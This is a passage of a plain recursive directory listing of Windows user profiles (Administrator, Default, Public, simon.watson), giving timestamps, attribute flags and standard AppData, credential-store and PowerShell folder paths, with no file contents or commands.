Explorer/DOMStore/OE6AMWVI 2025-02-16 10:52:22 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Microsoft/Internet Explorer/DOMStore/X4PLXDN9 2025-02-16 10:48:53 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/TokenBroker/Cache 2025-02-16 10:52:22 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/CacheStorage 2025-02-16 10:54:27 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/Indexed DB 2025-02-16 10:59:28 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache 2025-02-16 11:11:30 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex 2025-02-16 11:11:30 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/DeviceSearchCache 2025-02-16 10:52:23 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/Flighting 2025-02-16 11:10:47 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{6eca1642-b3d7-4be3-80a7-3ed2d8020eaf} 2025-02-16 11:10:47 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ce0f41bc-1e91-49e0-b03c-1d884f810842} 2025-02-16 11:11:30 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{effa8414-bc5e-4b37-9bb2-488e334cafda} 2025-02-16 10:57:56 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ff6f46fd-3c24-4369-b7e0-93c115343bc2} 2025-02-16 10:48:53 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4} 2025-02-16 11:11:29 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{4b54d621-d387-4d8f-aab0-2a598448f98b} 2025-02-16 10:52:23 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{ca29f10f-66ec-4f93-874a-42f0228a3350} 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/AC 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/AppData 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/LocalCache 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/LocalState 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/RoamingState 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Settings 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/SystemAppData 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/TempState 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/AC/INetCache 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/AC/INetCookies 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/AC/INetHistory 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/AC/Temp 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/AC 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/AppData 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/LocalCache 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/LocalState 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/RoamingState 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/Settings 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/SystemAppData 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/TempState 2025-02-16 10:48:49 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/AC/INetCache 2025-02-16 10:48:49 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/AC/INetCookies 2025-02-16 10:48:49 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/AC/INetHistory 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/AC/Temp 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/AC 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/AppData 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/LocalCache 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/LocalState 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/RoamingState 2025-02-16 10:48:52 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/Settings 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/SystemAppData 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/TempState 2025-02-16 10:48:49 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/AC/INetCache 2025-02-16 10:48:49 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/AC/INetCookies 2025-02-16 10:48:49 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/AC/INetHistory 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/AC/Temp 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/AC 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/AppData 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/LocalCache 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/LocalState 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/RoamingState 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/Settings 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/SystemAppData 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/TempState 2025-02-16 11:11:00 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/AC/INetCache 2025-02-16 11:11:00 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/AC/INetCookies 2025-02-16 11:11:00 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/AC/INetHistory 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/AC/Temp 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/AC 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/AppData 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/LocalCache 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/LocalState 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/RoamingState 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/Settings 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/SystemAppData 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/TempState 2025-02-16 10:48:49 D.HS. Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/AC/INetCache 2025-02-16 10:48:49 D.HS. Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/AC/INetCookies 2025-02-16 10:48:49 D.HS. Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/AC/INetHistory 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/AC/Temp 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/AC 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/AppData 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/LocalCache 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/LocalState 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/RoamingState 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/Settings 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/SystemAppData 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/TempState 2025-02-16 11:11:00 D.HS. Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/AC/INetCache 2025-02-16 11:11:00 D.HS. Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/AC/INetCookies 2025-02-16 11:11:00 D.HS. Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/AC/INetHistory 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/AC/Temp 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/AC 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/AppData 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/LocalCache 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/LocalState 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/RoamingState 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/Settings 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/SystemAppData 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/TempState 2025-02-16 11:11:00 D.HS. Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/AC/INetCache 2025-02-16 11:11:00 D.HS. Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/AC/INetCookies 2025-02-16 11:11:00 D.HS. Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/AC/INetHistory 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/AC/Temp 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/AC 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/AppData 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/LocalCache 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/LocalState 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/RoamingState 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/Settings 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/SystemAppData 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/TempState 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/AC 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/AppData 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/LocalCache 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/LocalState 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/RoamingState 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/Settings 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/SystemAppData 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/TempState 2025-02-16 11:11:00 D.HS. Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/AC/INetCache 2025-02-16 11:11:00 D.HS. Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/AC/INetCookies 2025-02-16 11:11:00 D.HS. Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/AC/INetHistory 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/AC/Temp 2025-02-16 11:10:30 D.... Administrator/AppData/Local/Temp/Low 2025-02-16 10:48:49 D..S. Administrator/AppData/LocalLow/Microsoft 2025-02-16 10:48:49 D..S. Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache 2025-02-16 10:52:05 D..S. Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content 2025-02-16 10:52:05 D..S. Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData 2025-02-16 10:48:48 D.... Administrator/AppData/Roaming/Adobe 2025-02-16 11:21:31 D..S. Administrator/AppData/Roaming/Microsoft 2025-02-16 10:48:48 D.... Administrator/AppData/Roaming/Adobe/Flash Player 2025-02-16 10:48:48 D.... Administrator/AppData/Roaming/Adobe/Flash Player/NativeCache 2025-02-16 10:48:47 D..S. Administrator/AppData/Roaming/Microsoft/Credentials 2025-02-16 10:48:47 D..S. Administrator/AppData/Roaming/Microsoft/Crypto 2025-02-16 10:48:48 D.... Administrator/AppData/Roaming/Microsoft/Internet Explorer 2025-02-16 11:21:31 D.... Administrator/AppData/Roaming/Microsoft/MMC 2025-02-16 10:48:47 D..S. Administrator/AppData/Roaming/Microsoft/Protect 2021-05-08 08:20:24 D.... Administrator/AppData/Roaming/Microsoft/Spelling 2025-02-16 10:48:49 D..S. Administrator/AppData/Roaming/Microsoft/SystemCertificates 2025-02-16 10:48:47 D.... Administrator/AppData/Roaming/Microsoft/Vault 2025-02-16 11:04:05 D.... Administrator/AppData/Roaming/Microsoft/Windows 2025-02-16 10:48:47 D..S. Administrator/AppData/Roaming/Microsoft/Crypto/Keys 2025-02-16 10:48:47 D..S. Administrator/AppData/Roaming/Microsoft/Crypto/RSA 2025-02-16 10:48:47 D..S. Administrator/AppData/Roaming/Microsoft/Crypto/RSA/S-1-5-21-1498285545-150618015-1395900109-500 2025-02-16 10:48:49 DR... Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch 2025-02-16 10:48:48 D.... Administrator/AppData/Roaming/Microsoft/Internet Explorer/UserData 2025-02-16 10:48:53 D.H.. Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned 2025-02-16 10:48:49 D.... Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned/ImplicitAppShortcuts 2025-02-16 10:48:53 DR... Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar 2025-02-16 10:48:48 D.... Administrator/AppData/Roaming/Microsoft/Internet Explorer/UserData/Low 2025-02-16 10:48:47 D..S. Administrator/AppData/Roaming/Microsoft/Protect/S-1-5-21-1498285545-150618015-1395900109-500 2025-02-16 10:48:49 D..S. Administrator/AppData/Roaming/Microsoft/SystemCertificates/My 2025-02-16 10:48:49 D..S. Administrator/AppData/Roaming/Microsoft/SystemCertificates/My/Certificates 2025-02-16 10:48:49 D..S. Administrator/AppData/Roaming/Microsoft/SystemCertificates/My/CRLs 2025-02-16 10:48:49 D..S. Administrator/AppData/Roaming/Microsoft/SystemCertificates/My/CTLs 2025-02-16 10:48:49 DR... Administrator/AppData/Roaming/Microsoft/Windows/AccountPictures 2021-05-08 08:20:24 D.... Administrator/AppData/Roaming/Microsoft/Windows/CloudStore 2025-02-16 10:48:49 DR... Administrator/AppData/Roaming/Microsoft/Windows/Libraries 2021-05-08 08:20:24 D.... Administrator/AppData/Roaming/Microsoft/Windows/Network Shortcuts 2021-05-08 08:20:24 D.... Administrator/AppData/Roaming/Microsoft/Windows/Printer Shortcuts 2025-02-16 11:18:05 DR... Administrator/AppData/Roaming/Microsoft/Windows/Recent 2025-02-16 10:48:53 DR... Administrator/AppData/Roaming/Microsoft/Windows/SendTo 2025-02-16 11:18:27 D.... Administrator/AppData/Roaming/Microsoft/Windows/ServerManager 2025-02-16 10:48:48 DR... Administrator/AppData/Roaming/Microsoft/Windows/Start Menu 2021-05-08 08:20:24 D.... Administrator/AppData/Roaming/Microsoft/Windows/Templates 2025-02-16 11:10:31 D.... Administrator/AppData/Roaming/Microsoft/Windows/Themes 2025-02-16 11:18:05 D.... Administrator/AppData/Roaming/Microsoft/Windows/Recent/AutomaticDestinations 2025-02-16 11:10:46 D.... Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations 2025-02-16 10:48:49 DR... Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs 2022-03-03 03:58:21 DR... Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility 2025-02-16 10:48:48 DR... Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories 2025-02-16 10:48:49 DR... Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Administrative Tools 2021-05-08 08:20:26 D.... Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Maintenance 2025-02-16 10:48:49 DR... Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup 2021-05-08 08:20:26 DR... Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools 2022-03-03 03:58:19 D.... Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell 2025-02-16 11:10:31 D.... Administrator/AppData/Roaming/Microsoft/Windows/Themes/CachedFiles 2025-02-16 10:48:48 DR... Administrator/Favorites/Links 2021-05-08 08:20:24 D.H.. Default/AppData 2021-05-08 08:20:24 DR... Default/Desktop 2025-02-16 19:48:13 DR... Default/Documents 2021-05-08 08:20:24 DR... Default/Downloads 2021-05-08 08:20:24 DR... Default/Favorites 2021-05-08 08:20:24 DR... Default/Links 2021-05-08 08:20:24 DR... Default/Music 2021-05-08 08:20:24 DR... Default/Pictures 2021-05-08 08:20:24 D.... Default/Saved Games 2021-05-08 08:20:24 DR... Default/Videos 2025-02-16 19:48:13 D.... Default/AppData/Local 2021-05-08 08:34:59 D.... Default/AppData/Roaming 2021-05-08 08:34:49 D.... Default/AppData/Local/Microsoft 2021-05-08 08:20:24 D.... Default/AppData/Local/Temp 2021-05-08 08:34:49 D.... Default/AppData/Local/Microsoft/InputPersonalization 2025-02-16 19:48:13 D.... Default/AppData/Local/Microsoft/Windows 2021-05-08 08:20:26 D.HS. Default/AppData/Local/Microsoft/Windows Sidebar 2021-05-08 08:20:24 D..S. Default/AppData/Local/Microsoft/WindowsApps 2021-05-08 08:20:24 D.... Default/AppData/Local/Microsoft/InputPersonalization/TrainedDataStore 2021-05-08 08:20:24 D.... Default/AppData/Local/Microsoft/Windows/CloudStore 2021-05-08 08:20:24 D.... Default/AppData/Local/Microsoft/Windows/GameExplorer 2021-05-08 08:20:24 D..S. Default/AppData/Local/Microsoft/Windows/History 2021-05-08 08:20:24 D..S. Default/AppData/Local/Microsoft/Windows/INetCache 2021-05-08 08:20:24 D..S. Default/AppData/Local/Microsoft/Windows/INetCookies 2025-02-16 11:05:50 D.... Default/AppData/Local/Microsoft/Windows/Shell 2021-05-08 08:20:24 D.... Default/AppData/Local/Microsoft/Windows/WinX 2021-05-08 08:20:35 DR... Default/AppData/Local/Microsoft/Windows/WinX/Group1 2021-05-08 08:20:35 DR... Default/AppData/Local/Microsoft/Windows/WinX/Group2 2021-05-08 08:20:35 DR... Default/AppData/Local/Microsoft/Windows/WinX/Group3 2021-05-08 08:20:24 D.... Default/AppData/Local/Microsoft/Windows Sidebar/Gadgets 2021-05-08 08:34:59 D..S. Default/AppData/Roaming/Microsoft 2021-05-08 08:34:59 D.... Default/AppData/Roaming/Microsoft/Internet Explorer 2021-05-08 08:20:24 D.... Default/AppData/Roaming/Microsoft/Spelling 2021-05-08 08:34:49 D.... Default/AppData/Roaming/Microsoft/Windows 2021-05-08 08:20:35 DR... Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch 2021-05-08 08:20:24 D.... Default/AppData/Roaming/Microsoft/Windows/CloudStore 2021-05-08 08:20:24 D.... Default/AppData/Roaming/Microsoft/Windows/Network Shortcuts 2021-05-08 08:20:24 D.... Default/AppData/Roaming/Microsoft/Windows/Printer Shortcuts 2021-05-08 08:20:24 DR... Default/AppData/Roaming/Microsoft/Windows/Recent 2021-05-08 08:34:49 DR... Default/AppData/Roaming/Microsoft/Windows/SendTo 2021-05-08 08:20:24 DR... Default/AppData/Roaming/Microsoft/Windows/Start Menu 2021-05-08 08:20:24 D.... Default/AppData/Roaming/Microsoft/Windows/Templates 2021-05-08 08:34:49 D.... Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs 2025-02-16 11:05:58 DR... Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility 2021-05-08 08:20:26 D.... Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories 2021-05-08 08:20:26 D.... Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Maintenance 2021-05-08 08:20:26 DR... Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools 2022-03-03 03:58:19 D.... Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell 2025-02-16 10:48:48 DRH.. Public/AccountPictures 2021-05-08 08:20:26 DRH.. Public/Desktop 2025-02-16 19:48:13 DR... Public/Documents 2021-05-08 08:20:26 DR... Public/Downloads 2021-05-08 08:34:49 DRH.. Public/Libraries 2021-05-08 08:20:26 DR... Public/Music 2021-05-08 08:20:26 DR... Public/Pictures 2021-05-08 08:20:26 DR... Public/Videos 2025-02-16 11:15:52 D.H.. simon.watson/AppData 2021-05-08 08:20:24 DR... simon.watson/Desktop 2025-02-16 11:15:52 DR... simon.watson/Documents 2021-05-08 08:20:24 DR... simon.watson/Downloads 2021-05-08 08:20:24 DR... simon.watson/Favorites 2021-05-08 08:20:24 DR... simon.watson/Links 2021-05-08 08:20:24 DR... simon.watson/Music 2021-05-08 08:20:24 DR... simon.watson/Pictures 2021-05-08 08:20:24 D.... simon.watson/Saved Games 2021-05-08 08:20:24 DR... simon.watson/Videos 2025-02-16 11:15:52 D.... simon.watson/AppData/Local 2025-02-16 11:15:52 D.... simon.watson/AppData/LocalLow 2021-05-08 08:34:59 D.... simon.watson/AppData/Roaming 2021-05-08 08:34:49 D.... simon.watson/AppData/Local/Microsoft 2025-02-16 11:17:59 D.... simon.watson/AppData/Local/Temp 2021-05-08 08:34:49 D.... simon.watson/AppData/Local/Microsoft/InputPersonalization 2025-02-16 11:17:58 D.... simon.watson/AppData/Local/Microsoft/Windows 2021-05-08 08:20:26 D.HS. simon.watson/AppData/Local/Microsoft/Windows Sidebar 2021-05-08 08:20:24 D..S. simon.watson/AppData/Local/Microsoft/WindowsApps 2021-05-08 08:20:24 D.... simon.watson/AppData/Local/Microsoft/InputPersonalization/TrainedDataStore 2021-05-08 08:20:24 D.... simon.watson/AppData/Local/Microsoft/Windows/CloudStore 2021-05-08 08:20:24 D.... simon.watson/AppData/Local/Microsoft/Windows/GameExplorer 2021-05-08 08:20:24 D..S. simon.watson/AppData/Local/Microsoft/Windows/History 2021-05-08 08:20:24 D..S. simon.watson/AppData/Local/Microsoft/Windows/INetCache 2021-05-08 08:20:24 D..S. simon.watson/AppData/Local/Microsoft/Windows/INetCookies 2025-02-16 11:18:02 D.... simon.watson/AppData/Local/Microsoft/Windows/PowerShell 2025-02-16 11:05:50 D.... simon.watson/AppData/Local/Microsoft/Windows/Shell 2021-05-08 08:20:24 D.... simon.watson/AppData/Local/Microsoft/Windows/WinX 2021-05-08 08:20:35 DR... simon.watson/AppData/Local/Microsoft/Windows/WinX/Group1 2021-05-08 08:20:35 DR... simon.watson/AppData/Local/Microsoft/Windows/WinX/Group2 2021-05-08 08:20:35 DR... simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3 2021-05-08 08:20:24 D.... simon.watson/AppData/Local/Microsoft/Windows Sidebar/Gadgets 2021-05-08 08:34:59 D..S. simon.watson/AppData/Roaming/Microsoft 2021-05-08 08:34:59 D.... simon.watson/AppData/Roaming/Microsoft/Internet Explorer 2021-05-08 08:20:24 D.... simon.watson/AppData/Roaming/Microsoft/Spelling 2025-02-16 11:18:01 D.... simon.watson/AppData/Roaming/Microsoft/Windows 2021-05-08 08:20:35 DR... simon.watson/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch 2021-05-08 08:20:24 D.... simon.watson/AppData/Roaming/Microsoft/Windows/CloudStore 2021-05-08 08:20:24 D.... simon.watson/AppData/Roaming/Microsoft/Windows/Network Shortcuts 2025-02-16 11:18:01 D.... simon.watson/AppData/Roaming/Microsoft/Windows/PowerShell 2021-05-08 08:20:24 D.... simon.watson/AppData/Roaming/Microsoft/Windows/Printer Shortcuts 2021-05-08 08:20:24 DR... simon.watson/AppData/Roaming/Microsoft/Windows/Recent 2021-05-08 08:34:49 DR... simon.watson/AppData/Roaming/Microsoft/Windows/SendTo 2021-05-08 08:20:24 DR... simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu 2021-05-08 08:20:24 D.... simon.watson/AppData/Roaming/Microsoft/Windows/Templates 2025-02-16 11:18:01 D.... simon.watson/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine 2021-05-08 08:34:49 